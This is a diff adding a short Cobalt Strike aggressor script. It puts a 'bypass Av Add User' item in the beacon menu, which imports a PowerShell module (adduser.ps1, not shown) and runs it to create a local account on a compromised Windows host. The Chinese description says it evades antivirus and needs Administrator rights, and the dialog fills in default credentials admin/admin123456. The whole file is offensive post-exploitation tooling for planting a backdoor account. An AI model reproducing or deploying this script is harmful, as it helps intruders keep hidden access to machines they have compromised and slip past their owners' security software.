@@ -1,0 +1,17 @@
+sub Adduser{
+	bpowershell_import($bid, getFileProper(script_resource("modules"), "adduser.ps1"));
+	bpowerpick($bid, "AddUser "."\"$3['username']\" "."\"$3['password']\"");
+}
+
+popup beacon_bottom{
+	item "bypass Av Add User" {
+		$bid = $1;
+		$add = dialog("AddUser", %(username => "admin", password => "admin123456", bid => $bid), &Adduser);
+		dialog_description($add, "绕过杀软进行添加用户\n条件:拥有Administrator权限");
+
+		drow_text($add, "username", "Username:");
+		drow_text($add, "password", "Password:");
+		dbutton_action($add, "Run");
+		dialog_show($add);
+	}
+}
